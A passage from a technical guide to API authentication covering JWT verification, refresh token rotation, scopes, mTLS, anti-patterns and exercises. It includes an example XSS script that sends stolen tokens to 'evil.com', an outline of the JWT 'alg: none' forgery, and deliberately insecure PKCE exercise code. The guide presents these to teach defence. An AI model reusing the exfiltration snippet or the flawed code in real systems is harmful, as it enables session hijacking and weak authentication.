      maxTokenAge: '1h',               // Must be issued within the last 1 hour
      clockTolerance: 30,              // Allow 30-second clock skew
    });

    return {
      userId: payload.sub,
      scopes: payload.scope?.split(' ') || [],
      roles: payload.role ? [payload.role] : [],
      expiresAt: new Date(payload.exp * 1000),
      issuedAt: new Date(payload.iat * 1000),
    };
  } catch (error) {
    if (error instanceof errors.JWTExpired) {
      throw new AuthError('TOKEN_EXPIRED', 'The access token has expired.');
    }
    if (error instanceof errors.JWTClaimValidationFailed) {
      throw new AuthError('INVALID_CLAIMS', `Token claim validation failed: ${error.message}`);
    }
    if (error instanceof errors.JWSSignatureVerificationFailed) {
      throw new AuthError('INVALID_SIGNATURE', 'Token signature verification failed.');
    }
    throw new AuthError('INVALID_TOKEN', 'The access token is invalid.');
  }
}

// Custom error class
class AuthError extends Error {
  constructor(code, message) {
    super(message);
    this.code = code;
    this.name = 'AuthError';
  }
}

// Express.js middleware
async function jwtAuthMiddleware(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({
      type: 'https://api.example.com/errors/missing-token',
      title: 'Authentication Required',
      status: 401,
      detail: 'A Bearer token is required in the Authorization header.',
    });
  }

  const token = authHeader.substring(7);

  try {
    req.user = await verifyToken(token);
    next();
  } catch (error) {
    if (error instanceof AuthError) {
      const status = error.code === 'TOKEN_EXPIRED' ? 401 : 403;
      return res.status(status).json({
        type: `https://api.example.com/errors/${error.code.toLowerCase().replace(/_/g, '-')}`,
        title: error.code,
        status: status,
        detail: error.message,
      });
    }
    return res.status(401).json({
      type: 'https://api.example.com/errors/authentication-failed',
      title: 'Authentication Failed',
      status: 401,
      detail: 'Failed to authenticate the request.',
    });
  }
}
```

### 7.4 JWT Issuance Implementation

```javascript
// JWT issuance (jose library)
import { SignJWT, importPKCS8 } from 'jose';
import fs from 'fs';

// Load private key (RS256)
const privateKeyPem = fs.readFileSync('./keys/private.pem', 'utf-8');
const privateKey = await importPKCS8(privateKeyPem, 'RS256');

async function issueAccessToken(user, scopes) {
  const token = await new SignJWT({
    scope: scopes.join(' '),
    role: user.role,
    email: user.email,
  })
    .setProtectedHeader({
      alg: 'RS256',
      typ: 'JWT',
      kid: 'key_2024_01',
    })
    .setSubject(user.id)
    .setIssuer('https://auth.example.com')
    .setAudience('https://api.example.com')
    .setIssuedAt()
    .setExpirationTime('15m')  // 15-minute expiry
    .setJti(crypto.randomUUID())
    .sign(privateKey);

  return token;
}

async function issueRefreshToken(user) {
  const refreshTokenId = crypto.randomUUID();

  // Store Refresh Token in database (stateful)
  await db.refreshTokens.insertOne({
    id: refreshTokenId,
    userId: user.id,
    createdAt: new Date(),
    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), // 30 days
    revokedAt: null,
    family: crypto.randomUUID(), // Family ID for Token Rotation
  });

  // Issue Refresh Token as a JWT (with minimal payload)
  const token = await new SignJWT({ type: 'refresh' })
    .setProtectedHeader({ alg: 'RS256', typ: 'JWT' })
    .setSubject(user.id)
    .setIssuer('https://auth.example.com')
    .setExpirationTime('30d')
    .setJti(refreshTokenId)
    .sign(privateKey);

  return token;
}
```

---

## 8. Access Token + Refresh Token

### 8.1 Token Lifecycle

```
Token Lifecycle Overview:

  ┌──────────────────────────────────────────────────────────────┐
  │                       User Login                             │
  │                           │                                  │
  │                    ┌──────┴──────┐                           │
  │                    │ Issue token │                           │
  │                    └──────┬──────┘                           │
  │                           │                                  │
  │              ┌────────────┼────────────┐                    │
  │              │                         │                    │
  │         Access Token            Refresh Token               │
  │         (short-lived: 15m)      (long-lived: 30d)          │
  │              │                         │                    │
  │         ┌────┴────┐                    │                    │
  │         │API call │                    │                    │
  │         └────┬────┘                    │                    │
  │              │                         │                    │
  │         [Expired]                      │                    │
  │              │                         │                    │
  │         ┌────┴─────────┐               │                    │
  │         │   Refresh    │←──────────────┘                    │
  │         └────┬─────────┘                                    │
  │              │                                              │
  │    ┌─────────┼─────────┐                                    │
  │    │                   │                                    │
  │ New Access Token  New Refresh Token                         │
  │ (15m)             (30d)                                     │
  │                   Old Refresh Token → Invalidated immediately│
  │                                                             │
  │         [Anomaly detected]                                   │
  │              │                                              │
  │    ┌─────────┴─────────┐                                    │
  │    │ Invalidate all    │                                    │
  │    │ tokens (by family)│                                    │
  │    └───────────────────┘                                    │
  └──────────────────────────────────────────────────────────────┘
```

### 8.2 Refresh Token Rotation

Refresh Token Rotation is a technique that issues a new token pair when a Refresh Token is used and immediately invalidates the old token. It is an effective security pattern for detecting theft.

```javascript
// Refresh Token Rotation implementation
async function refreshTokens(refreshToken) {
  // 1. Validate the Refresh Token
  let payload;
  try {
    const result = await jwtVerify(refreshToken, JWKS, {
      issuer: 'https://auth.example.com',
    });
    payload = result.payload;
  } catch {
    throw new AuthError('INVALID_REFRESH_TOKEN', 'The refresh token is invalid.');
  }

  // 2. Check token status in the database
  const tokenRecord = await db.refreshTokens.findOne({ id: payload.jti });

  if (!tokenRecord) {
    throw new AuthError('TOKEN_NOT_FOUND', 'Refresh token not found.');
  }

  // 3. If an already-revoked token is used → possible theft
  if (tokenRecord.revokedAt) {
    // Revoke all tokens in the same family (security measure)
    await db.refreshTokens.updateMany(
      { family: tokenRecord.family },
      { $set: { revokedAt: new Date(), revokeReason: 'reuse_detected' } }
    );

    // Send security alert
    await notifySecurityTeam({
      type: 'REFRESH_TOKEN_REUSE',
      userId: tokenRecord.userId,
      tokenId: tokenRecord.id,
      family: tokenRecord.family,
    });

    throw new AuthError(
      'TOKEN_REUSE_DETECTED',
      'Refresh token reuse detected. All sessions have been revoked.'
    );
  }

  // 4. Check expiry
  if (tokenRecord.expiresAt < new Date()) {
    throw new AuthError('REFRESH_TOKEN_EXPIRED', 'The refresh token has expired.');
  }

  // 5. Revoke the old Refresh Token
  await db.refreshTokens.updateOne(
    { id: tokenRecord.id },
    { $set: { revokedAt: new Date(), revokeReason: 'rotated' } }
  );

  // 6. Retrieve user information
  const user = await db.users.findOne({ id: tokenRecord.userId });

  // 7. Issue a new token pair
  const newAccessToken = await issueAccessToken(user, user.scopes);
  const newRefreshToken = await issueRefreshToken(user);

  // Associate new Refresh Token with the same family
  await db.refreshTokens.updateOne(
    { id: (await jwtVerify(newRefreshToken, JWKS)).payload.jti },
    { $set: { family: tokenRecord.family } }
  );

  return {
    access_token: newAccessToken,
    token_type: 'Bearer',
    expires_in: 900, // 15 minutes
    refresh_token: newRefreshToken,
  };
}
```

### 8.3 Token Storage Locations

```
Secure Token Storage Locations:

  ┌────────────────────────────────────────────────────────────┐
  │ Recommended Storage by Platform                            │
  ├────────────────────────────────────────────────────────────┤
  │                                                            │
  │ [Web SPA]                                                  │
  │   Access Token  → JavaScript variable (in memory)         │
  │   Refresh Token → HttpOnly Cookie                         │
  │     Attributes: Secure; HttpOnly; SameSite=Strict;        │
  │                 Path=/auth                                │
  │                                                            │
  │   BAD: localStorage (stolen via XSS)                      │
  │   BAD: sessionStorage (stolen via XSS)                    │
  │   BAD: Regular Cookie (accessible from JavaScript)        │
  │                                                            │
  │ [Mobile (iOS)]                                             │
  │   Access Token  → Memory                                  │
  │   Refresh Token → Keychain Services                       │
  │     kSecAttrAccessible: kSecAttrAccessibleAfterFirstUnlock│
  │                                                            │
  │ [Mobile (Android)]                                         │
  │   Access Token  → Memory                                  │
  │   Refresh Token → EncryptedSharedPreferences              │
  │     or Android Keystore                                   │
  │                                                            │
  │ [Server Side]                                              │
  │   Access Token  → Memory / Redis                          │
  │   Refresh Token → Encrypted database                      │
  └────────────────────────────────────────────────────────────┘
```

---

## 9. Scope Design

### 9.1 Design Principles

Scopes are the unit of permission control in OAuth 2.0, defining the range of resources and operations a client can access.

```
Scope Design Principles:

  Format: resource:operation
  Principle: Principle of Least Privilege

  Basic Scope Examples:
  ┌──────────────────────────────────────────────────────┐
  │ Scope Name          Description                       │
  ├──────────────────────────────────────────────────────┤
  │ users:read          Read user information             │
  │ users:write         Create/update user information   │
  │ users:delete        Delete users                      │
  │ orders:read         Read order information            │
  │ orders:write        Create/update orders             │
  │ orders:delete       Delete orders                    │
  │ billing:read        Read billing information          │
  │ billing:manage      Manage billing (create/update/delete) │
  │ admin:all           Admin privileges (all operations) │
  │ openid              Required scope for OpenID Connect │
  │ profile             User profile information          │
  │ email               Email address                     │
  └──────────────────────────────────────────────────────┘

  Hierarchical Scope Design:
    read  < write < admin
    users:read ⊂ users:write ⊂ users:admin ⊂ admin:all

  Scope Granularity Guidelines:
    Too coarse: api:access (access to all APIs) → too broad
    Too fine: users:name:read (read name only) → complex to manage
    Appropriate: users:read (read user info) → well balanced
```

### 9.2 Scope Validation Implementation

```javascript
// Scope check middleware
function requireScope(...requiredScopes) {
  return (req, res, next) => {
    if (!req.user || !req.user.scopes) {
      return res.status(401).json({
        type: 'https://api.example.com/errors/unauthenticated',
        title: 'Authentication Required',
        status: 401,
      });
    }

    const tokenScopes = req.user.scopes;

    // Resolve hierarchical scopes
    const effectiveScopes = resolveHierarchicalScopes(tokenScopes);

    const hasAllScopes = requiredScopes.every(
      scope => effectiveScopes.includes(scope)
    );

    if (!hasAllScopes) {
      return res.status(403).json({
        type: 'https://api.example.com/errors/insufficient-scope',
        title: 'Insufficient Scope',
        status: 403,
        detail: `Required scopes: ${requiredScopes.join(', ')}`,
        required_scopes: requiredScopes,
        granted_scopes: tokenScopes,
      });
    }

    next();
  };
}

// Resolve hierarchical scopes
function resolveHierarchicalScopes(scopes) {
  const hierarchy = {
    'admin:all': ['users:read', 'users:write', 'users:delete',
                  'orders:read', 'orders:write', 'orders:delete',
                  'billing:read', 'billing:manage'],
    'users:write': ['users:read'],
    'users:delete': ['users:read', 'users:write'],
    'orders:write': ['orders:read'],
    'orders:delete': ['orders:read', 'orders:write'],
    'billing:manage': ['billing:read'],
  };

  const resolved = new Set(scopes);
  for (const scope of scopes) {
    if (hierarchy[scope]) {
      hierarchy[scope].forEach(s => resolved.add(s));
    }
  }

  return Array.from(resolved);
}

// Apply to routes
app.get('/api/v1/users', requireScope('users:read'), listUsers);
app.post('/api/v1/users', requireScope('users:write'), createUser);
app.delete('/api/v1/users/:id', requireScope('users:delete'), deleteUser);
app.get('/api/v1/orders', requireScope('orders:read'), listOrders);
app.post('/api/v1/orders', requireScope('orders:write'), createOrder);
app.get('/api/v1/billing', requireScope('billing:read'), getBilling);
app.post('/api/v1/billing', requireScope('billing:manage'), updateBilling);
```

---

## 10. mTLS (Mutual TLS Authentication)

### 10.1 Mechanism

mTLS (Mutual TLS) adds client certificate authentication on top of standard TLS (which only requires a server certificate). It is used in scenarios requiring the highest level of security, such as financial, medical, and government APIs.

```
mTLS Handshake:

  Standard TLS (one-way):
    Client → Server: ClientHello
    Client ← Server: ServerHello + Server Certificate
    Client:          Validates server certificate
    Client → Server: Begin encrypted communication

  mTLS (two-way):
    Client → Server: ClientHello
    Client ← Server: ServerHello + Server Certificate
                      + CertificateRequest ← Request client certificate
    Client:          Validates server certificate
    Client → Server: Client Certificate    ← Send client certificate
                      + CertificateVerify  ← Prove ownership with signature
    Server:          Validates client certificate
    Both:            Begin encrypted communication

  Chain of Trust:
    ┌──────────┐         ┌──────────┐
    │ Root CA  │ ──────→ │ Inter CA │
    └──────────┘         └────┬─────┘
                              │
                    ┌─────────┼─────────┐
                    │                   │
              ┌─────┴─────┐       ┌─────┴─────┐
              │  Server   │       │  Client   │
              │Certificate│       │Certificate│
              └───────────┘       └───────────┘
```

```javascript
// mTLS server configuration in Node.js
import https from 'https';
import fs from 'fs';
import express from 'express';

const app = express();

// mTLS middleware: extract client certificate information
app.use((req, res, next) => {
  const cert = req.socket.getPeerCertificate();

  if (!req.client.authorized) {
    return res.status(403).json({
      error: 'Client certificate required',
      detail: 'A valid client certificate is required for this endpoint.',
    });
  }

  req.clientCert = {
    subject: cert.subject,
    issuer: cert.issuer,
    serialNumber: cert.serialNumber,
    fingerprint: cert.fingerprint256,
    validFrom: cert.valid_from,
    validTo: cert.valid_to,
  };

  next();
});

const server = https.createServer(
  {
    key: fs.readFileSync('./certs/server-key.pem'),
    cert: fs.readFileSync('./certs/server-cert.pem'),
    ca: fs.readFileSync('./certs/ca-cert.pem'),
    requestCert: true,       // Require client certificate
    rejectUnauthorized: true, // Reject invalid certificates
  },
  app
);

server.listen(443, () => {
  console.log('mTLS server running on port 443');
});
```

---

## 11. Anti-Patterns

This section explains common dangerous patterns in authentication implementations.

### 11.1 Anti-Pattern 1: Not Validating the JWT Signing Algorithm

```
Anti-Pattern: Trusting the alg header

  Attack Scenario:
  ┌──────────────────────────────────────────────────────────────┐
  │                                                              │
  │  1. Legitimate JWT (signed with RS256):                      │
  │     Header: { "alg": "RS256", "kid": "key_01" }             │
  │     → Server signs with private key, validates with public key │
  │                                                              │
  │  2. Attacker rewrites alg to HS256:                          │
  │     Header: { "alg": "HS256" }                               │
  │     → Signs with public key (public info) using HS256        │
  │     → Server trusts the alg header and validates with HS256  │
  │     → Validates against public key → succeeds!              │
  │                                                              │
  │  3. Attacker rewrites alg to none:                           │
  │     Header: { "alg": "none" }                                │
  │     → Server accepts an unsigned JWT                         │
  │                                                              │
  │  Impact: Can forge JWTs with arbitrary claims               │
  │          → Gain admin privileges, impersonate other users   │
  └──────────────────────────────────────────────────────────────┘

  Countermeasures:
  ┌──────────────────────────────────────────────────────────────┐
  │  [Required] Specify the algorithm server-side during validation │
  │  [Required] Reject the "none" algorithm                      │
  │  [Recommended] Keep JWT libraries up to date                 │
  └──────────────────────────────────────────────────────────────┘
```

```javascript
// BAD: No algorithm specified (trusts the token's alg header)
const payload = jwt.verify(token, publicKey); // Dangerous

// GOOD: Explicitly specify allowed algorithms
const payload = jwt.verify(token, publicKey, {
  algorithms: ['RS256'],  // Only allow RS256
});

// GOOD: Secure validation with the jose library
const { payload } = await jwtVerify(token, JWKS, {
  algorithms: ['RS256', 'ES256'],  // Explicitly specify allow list
  issuer: 'https://auth.example.com',
  audience: 'https://api.example.com',
});
```

### 11.2 Anti-Pattern 2: Storing Tokens in localStorage

```
Anti-Pattern: Storing tokens in localStorage

  Problem:
  ┌──────────────────────────────────────────────────────────────┐
  │                                                              │
  │  localStorage.setItem('access_token', token);  ← Dangerous  │
  │  localStorage.setItem('refresh_token', refreshToken); ← Dangerous │
  │                                                              │
  │  An XSS attack can steal tokens via JavaScript:             │
  │                                                              │
  │  // Script injected by attacker                              │
  │  const token = localStorage.getItem('access_token');         │
  │  fetch('https://evil.com/steal', {                           │
  │    method: 'POST',                                           │
  │    body: JSON.stringify({ token }),                           │
  │  });                                                         │
  │                                                              │
  │  Impact:                                                     │
  │  · Access Token is stolen, enabling unauthorized API access  │
  │  · Refresh Token is stolen, enabling long-term access        │
  │  · User session is completely hijacked                       │
  └──────────────────────────────────────────────────────────────┘

  Countermeasures:
  ┌──────────────────────────────────────────────────────────────┐
  │  Access Token  → Keep in memory (JavaScript variable/closure)│
  │  Refresh Token → Store in HttpOnly Cookie                    │
  │                                                              │
  │  // Setting an HttpOnly Cookie (server side)                 │
  │  res.cookie('refresh_token', refreshToken, {                 │
  │    httpOnly: true,      // Not accessible from JavaScript    │
  │    secure: true,        // HTTPS connections only            │
  │    sameSite: 'Strict',  // Do not send in cross-site requests│
  │    path: '/api/auth',   // Auth endpoint only                │
  │    maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days             │
  │  });                                                         │
  └──────────────────────────────────────────────────────────────┘
```

### 11.3 Anti-Pattern 3: Embedding API Keys in Client Code

```
Anti-Pattern: Including secret keys in frontend code

  Problematic code example:
  ┌──────────────────────────────────────────────────────────────┐
  │  // Inside a React component                                 │
  │  const API_KEY = 'sk_live_abc123def456';  ← Secret key       │
  │                                                              │
  │  fetch('https://api.example.com/data', {                     │
  │    headers: { 'Authorization': `Bearer ${API_KEY}` }         │
  │  });                                                         │
  │                                                              │
  │  Problems:                                                   │
  │  1. The key is included in the build artifact (bundle.js)   │
  │  2. Easily visible in browser DevTools                       │
  │  3. Risk of inclusion in source code repositories            │
  │  4. Even in .env.local, exposed to client via NEXT_PUBLIC_   │
  │     prefix                                                   │
  └──────────────────────────────────────────────────────────────┘

  Countermeasures:
  ┌──────────────────────────────────────────────────────────────┐
  │  1. Adopt the BFF (Backend for Frontend) pattern             │
  │     Client → BFF → External API                              │
  │     Keep the secret key on the BFF (server side)             │
  │                                                              │
  │  2. Use only public keys (pk_live_xxx) on the client         │
  │     Public keys are restricted to limited scopes             │
  │                                                              │
  │  3. Server-side proxy                                        │
  │     app.get('/api/proxy/data', async (req, res) => {        │
  │       const response = await fetch(externalUrl, {            │
  │         headers: {                                           │
  │           Authorization: `Bearer ${process.env.API_KEY}`     │
  │         }                                                    │
  │       });                                                    │
  │       res.json(await response.json());                       │
  │     });                                                      │
  └──────────────────────────────────────────────────────────────┘
```

---

## 12. Edge Case Analysis

### 12.1 Edge Case 1: JWT Expiry and Clock Skew

In distributed systems, server clocks may not be perfectly synchronized. This time difference (clock skew) can affect JWT validation.

```
Clock Skew Problem:

  Scenario:
    Authorization server time: 12:00:00
    Resource server time: 12:00:03 (3 seconds ahead)

    JWT iat (issued at): 12:00:00
    JWT exp (expiry):    12:15:00

  Problem Case 1: nbf (Not Before)
    Auth server: Issues JWT at 12:00:00 (nbf = 12:00:00)
    Resource server: 11:59:58 (2 seconds behind)
    → nbf > current time → Rejected as "not yet valid"

  Problem Case 2: exp (Expiration)
    Access Token expiry: 2 seconds left (exp = 12:15:00)
    Resource server time: 12:15:01 (1 second ahead)
    → exp < current time → Rejected as "expired"

  Countermeasures:
    1. Set clockTolerance (tolerance window)
       → Usually 15–60 seconds is appropriate
       → Too large extends the window where revoked tokens can be used

    2. Synchronize server time with NTP (Network Time Protocol)
       → Amazon Time Sync Service, Google Public NTP, etc.

    3. Set a sufficiently long Access Token expiry
       → At least 5 minutes (to reduce clock skew impact)
       → But too long increases security risk
```

```javascript
// JWT validation with clock skew tolerance
const { payload } = await jwtVerify(token, JWKS, {
  issuer: 'https://auth.example.com',
  audience: 'https://api.example.com',
  algorithms: ['RS256'],
  clockTolerance: 30,  // Allow 30-second clock skew
});
```

### 12.2 Edge Case 2: Concurrent Refresh Requests

In SPAs or mobile apps, if multiple API requests simultaneously detect token expiry, multiple refresh requests may be sent concurrently.

```
Concurrent Refresh Problem:

  Time T=0: Access Token expires

  Request A ──→ 401 Unauthorized ──→ Refresh Request A
  Request B ──→ 401 Unauthorized ──→ Refresh Request B
  Request C ──→ 401 Unauthorized ──→ Refresh Request C

  With Refresh Token Rotation enabled:
    Refresh A → New Token A issued, old Refresh Token revoked
    Refresh B → Old token used → "Token reuse detected" → All sessions revoked
    Refresh C → Same as above

  Result: User is forced to log out
```

```javascript
// Solution for concurrent refresh: refresh queue
class TokenManager {
  constructor(config) {
    this.config = config;
    this.accessToken = null;
    this.refreshPromise = null; // Share the in-progress refresh Promise
  }

  async getAccessToken() {
    return this.accessToken;
  }

  async refreshAccessToken() {
    // If already refreshing, return the same Promise (prevent duplicates)
    if (this.refreshPromise) {
      return this.refreshPromise;
    }

    this.refreshPromise = this._doRefresh();

    try {
      const result = await this.refreshPromise;
      return result;
    } finally {
      this.refreshPromise = null; // Clear after refresh completes
    }
  }

  async _doRefresh() {
    const response = await fetch(this.config.tokenEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      credentials: 'include', // Send HttpOnly Cookie
      body: new URLSearchParams({
        grant_type: 'refresh_token',
      }),
    });

    if (!response.ok) {
      // Refresh failed → redirect to login page
      this.accessToken = null;
      throw new Error('Token refresh failed');
    }

    const data = await response.json();
    this.accessToken = data.access_token;
    return data;
  }

  // Fetch with automatic retry
  async authenticatedFetch(url, options = {}) {
    let response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        Authorization: `Bearer ${this.accessToken}`,
      },
    });

    if (response.status === 401) {
      // Refresh token and retry
      await this.refreshAccessToken();
      response = await fetch(url, {
        ...options,
        headers: {
          ...options.headers,
          Authorization: `Bearer ${this.accessToken}`,
        },
      });
    }

    return response;
  }
}

// Usage example
const tokenManager = new TokenManager({
  tokenEndpoint: 'https://auth.example.com/oauth/token',
});

// Even with concurrent requests, refresh happens only once
const [users, orders, billing] = await Promise.all([
  tokenManager.authenticatedFetch('/api/v1/users'),
  tokenManager.authenticatedFetch('/api/v1/orders'),
  tokenManager.authenticatedFetch('/api/v1/billing'),
]);
```

### 12.3 Edge Case 3: Token Propagation in Microservices

In microservice architectures, how to propagate received tokens to downstream services is a challenge.

```
Token Propagation Challenge:

  Client → API Gateway → Service A → Service B → Service C
                │              │           │           │
                │  Token(user) │  ???      │  ???      │
                │              │           │           │

  Pattern 1: Token Forwarding
    Pass the received user token as-is to downstream
    · Advantage: Simple, user context is preserved
    · Disadvantage: All services share the same audience; scope too broad

  Pattern 2: Token Exchange (RFC 8693)
    Exchange the received token for a new one before passing downstream
    · Advantage: Minimum scope per service
    · Disadvantage: Additional requests to the authorization server

  Pattern 3: Internal Token + External Token
    External: Opaque/JWT token for users
    Internal: Separate token for service-to-service communication
    · Advantage: Separates internal and external concerns
    · Disadvantage: Increases complexity

  Recommended Approach:
    API Gateway validates user token
    → Sets authenticated context in internal request headers
    → Downstream services trust internal headers from Gateway

    X-User-Id: user_123
    X-User-Scopes: users:read orders:read
    X-Request-Id: req_abc123
```

---

## 13. Authentication Method Selection Guide

### 13.1 Decision Flowchart

```
Authentication Method Selection Flow:

  Who uses the API?
  │
  ├─ Third-party developers
  │   │
  │   ├─ Access to user data?
  │   │   ├─ Yes → OAuth 2.0 Authorization Code Flow
  │   │   │         + PKCE (for SPA)
  │   │   │
  │   │   └─ No (server-to-server only)
  │   │       └─ OAuth 2.0 Client Credentials Flow
  │   │
  │   └─ Public data only?
  │       └─ API Key (for rate limiting)
  │
  ├─ In-house Web App (SPA)
  │   └─ OAuth 2.0 Authorization Code + PKCE
  │       Access Token: Memory
  │       Refresh Token: HttpOnly Cookie
  │
  ├─ In-house Mobile App
  │   └─ OAuth 2.0 Authorization Code + PKCE
  │       Access Token: Memory
  │       Refresh Token: Keychain / Keystore
  │
  ├─ In-house Server-to-Server
  │   │
  │   ├─ High security requirements (financial/medical)?
  │   │   └─ mTLS + OAuth 2.0 Client Credentials
  │   │
  │   └─ Standard internal API?
  │       └─ API Key or OAuth 2.0 Client Credentials
  │
  └─ Development/Test Environment
      └─ Basic Auth or API Key (for testing)
```

### 13.2 Recommended Configuration by Application Type

```
Recommended Authentication Configuration by Application Type:

  ┌─────────────────────────────────────────────────────────────────┐
  │ App Type           Auth Method              Token Storage        │
  ├─────────────────────────────────────────────────────────────────┤
  │ SPA (React, etc.)  OAuth2 + PKCE         Memory + HttpOnly Cookie│
  │ SSR Web App        OAuth2 Auth Code      Session (server side)  │
  │ Mobile (iOS)       OAuth2 + PKCE         Memory + Keychain      │
  │ Mobile (Android)   OAuth2 + PKCE         Memory + Keystore      │
  │ CLI Tool           OAuth2 Device Flow    File (encrypted)       │
  │ Microservices      JWT + mTLS            Memory (short-lived)   │
  │ Batch Processing   Client Credentials    Memory (fetched at run)│
  │ IoT Device         mTLS + JWT            Secure element         │
  │ Third-party        OAuth2 Auth Code      Server session         │
  │ Internal Admin     API Key               Environment variable   │
  └─────────────────────────────────────────────────────────────────┘
```

---

## 14. Exercises

### 14.1 Exercise 1: Basic — Migrating from Basic Auth to Bearer Token

Rewrite the following API client that uses Basic Auth to use Bearer Token authentication.

```javascript
// Task: Change this Basic Auth client to use Bearer Token
class ApiClient {
  constructor(username, password) {
    this.credentials = btoa(`${username}:${password}`);
  }

  async getUsers() {
    const response = await fetch('https://api.example.com/v1/users', {
      headers: {
        'Authorization': `Basic ${this.credentials}`,
      },
    });
    return response.json();
  }
}

// Requirements:
// 1. Accept the token endpoint URL in the constructor
// 2. Implement a method to obtain an Access Token using
//    Client Credentials Flow with client_id and client_secret
// 3. Implement token expiry management (auto-renew before expiry)
// 4. Use Bearer Token in API requests
```

**Model Answer Key Points**:
- Use `grant_type=client_credentials` in the token request method
- Track `expiresAt` and auto-renew 5 minutes before expiry
- Auto-attach Bearer header in an `authenticatedFetch` method
- Include retry logic on error

### 14.2 Exercise 2: Intermediate — Completing a PKCE Implementation

The following PKCE implementation contains three security issues. Identify each one and fix it.

```javascript
// Task: Identify and fix the three security issues in the code below
class OAuthPKCE {
  generateCodeVerifier() {
    // Issue 1: Math.random is not cryptographically secure
    return Math.random().toString(36).substring(2, 15);
  }

  async generateCodeChallenge(verifier) {
    // Issue 2: code_challenge_method is plain (should use SHA-256)
    return verifier;
  }

  async startAuth() {
    const verifier = this.generateCodeVerifier();
    const challenge = await this.generateCodeChallenge(verifier);

    // Issue 3: localStorage is XSS-vulnerable (should use sessionStorage)
    localStorage.setItem('code_verifier', verifier);

    const params = new URLSearchParams({
      response_type: 'code',
      client_id: this.clientId,
      redirect_uri: this.redirectUri,
      code_challenge: challenge,
      code_challenge_method: 'plain',
    });

    window.location.href = `${this.authEndpoint}?${params}`;
  }
}

// Fix requirements:
// 1. Use crypto.getRandomValues for secure random generation
// 2. Generate code_challenge with SHA-256 + Base64URL encoding
// 3. Use sessionStorage (or an in-memory closure)
// 4. Change code_challenge_method to 'S256'
```

**Model Answer Key Points**:
- Generate random bytes with `crypto.getRandomValues(new Uint8Array(32))`
- Hash with `crypto.subtle.digest('SHA-256', data)`
- Base64URL encode (replace `+` with `-`, `/` with `_`, remove `=`)
- Change storage to `sessionStorage` or a variable

### 14.3 Exercise 3: Advanced — Multi-Tenant JWT Authentication System

Design and implement a JWT authentication middleware that satisfies the following requirements.

```
Requirements:
1. Multi-tenant support (different JWKS endpoint per tenant)
2. Tenant identification is performed from the iss claim of the JWT
3. Manage a whitelist of allowed issuers
4. Implement per-tenant rate limiting
5. Return detailed error responses on JWT validation failure
6. Implement JWKS caching to optimize performance

Design Hints:
  - Dynamically resolve the JWKS endpoint from the issuer
    Example: "https://tenant-a.auth.example.com"
            → "https://tenant-a.auth.example.com/.well-known/jwks.json"
  - Cache JWKS clients per tenant
  - Manage the tenant whitelist in a database
  - Implement rate limiting with a Redis-based sliding window
```

```javascript
// Skeleton code for the exercise
class MultiTenantJwtAuth {
  constructor() {
    this.jwksClients = new Map(); // JWKS client cache per tenant
    this.allowedIssuers = new Set(); // Set of allowed issuers
  }

  // TODO: Implement the following methods

  async loadAllowedIssuers() {
    // Load allowed issuers from the database
  }

  getJwksClient(issuer) {
    // Get the JWKS client for the given issuer (with caching)
  }

  async verifyToken(token) {
    // 1. Decode the JWT (pre-validation) to extract the issuer
    // 2. Check whether the issuer is in the whitelist
    // 3. Validate using the JWKS client for the issuer
    // 4. Return the validated payload
  }

  middleware() {
    // Return an Express.js middleware
    return async (req, res, next) => {
      // Authentication logic
    };
  }
}
```

**Model Answer Key Points**:
- Use `decodeJwt` from the `jose` library to extract the issuer before validation
- Cache `createRemoteJWKSet` per tenant
- Periodically reload the whitelist (e.g., every 5 minutes)
- Limit `Map` size to prevent memory leaks

---

## 15. Combining Authentication Patterns

In real production environments, it is common to use a combination of multiple authentication methods rather than a single one.

```
Authentication Pattern Combination Examples:

  Example 1: E-commerce API
  ┌─────────────────────────────────────────────────────────┐
  │ External:  OAuth 2.0 (third-party integrations)         │
  │ SPA:       OAuth 2.0 + PKCE (frontend)                 │
  │ Internal:  mTLS + JWT (between microservices)           │
  │ Admin:     API Key + IP restriction (admin tools)       │
  │ Monitoring:Basic Auth (monitoring tools like Prometheus)│
  └─────────────────────────────────────────────────────────┘

  Example 2: Financial API
  ┌─────────────────────────────────────────────────────────┐
  │ Customer:  OAuth 2.0 + PKCE + MFA (mobile banking)     │
  │ Partner:   mTLS + OAuth 2.0 Client Credentials         │
  │ Internal:  mTLS + JWT + IP restriction                  │
  │ All comm.: TLS 1.3 required, certificate pinning        │
  └─────────────────────────────────────────────────────────┘

  Example 3: SaaS Platform
  ┌─────────────────────────────────────────────────────────┐
  │ Dashboard: OAuth 2.0 + PKCE (SPA)                      │
  │ Public API:API Key + OAuth 2.0                          │
  │ Webhook:   HMAC signature verification                  │
  │ CLI:       OAuth 2.0 Device Code Flow                   │
  │ Internal:  JWT + service mesh (Istio, etc.)             │
  └─────────────────────────────────────────────────────────┘
```

---

## 16. Security Checklist

The following is a summary of items to verify when implementing authentication.

```
Authentication Security Checklist:

  [Communication]
  [ ] HTTPS is enforced on all API endpoints
  [ ] HSTS (HTTP Strict Transport Security) is configured
  [ ] TLS 1.2 or higher is required (TLS 1.0/1.1 disabled)
  [ ] Certificate expiry is monitored

  [Token Management]
  [ ] Access Token expiry is short (15 minutes to 1 hour)
  [ ] Refresh Tokens are invalidated after one use (Rotation)
  [ ] A token revocation endpoint is provided
  [ ] JWT signing algorithm is specified server-side
  [ ] "alg": "none" is rejected
  [ ] JWT issuer, audience, and expiration are all validated

  [Credential Protection]
  [ ] API Keys are stored hashed (not in plaintext)
  [ ] Secrets are not included in client code
  [ ] Tokens are not stored in localStorage
  [ ] Credentials are not sent in URL query parameters
  [ ] Credentials are not output in logs

  [Attack Mitigation]
  [ ] CSRF attacks are prevented with the state parameter
  [ ] PKCE is used (SPA/mobile)
  [ ] Constant-time comparison is used to prevent timing attacks
  [ ] Brute-force protection (rate limiting, account lockout)
  [ ] Refresh Token reuse is detected and all sessions are revoked

  [Operations]
  [ ] API Key rotation functionality is provided
  [ ] Unused API Keys are automatically detected and reported
  [ ] Authentication failure logs are collected and monitored
  [ ] A procedure exists to revoke all tokens during an incident
```

---

## Summary

| Method | Primary Use Case | Security | Implementation Cost | Stateless |
|--------|-----------------|----------|---------------------|-----------|
| Basic Auth | Dev environments, internal tools | Low (HTTPS required) | Lowest | No |
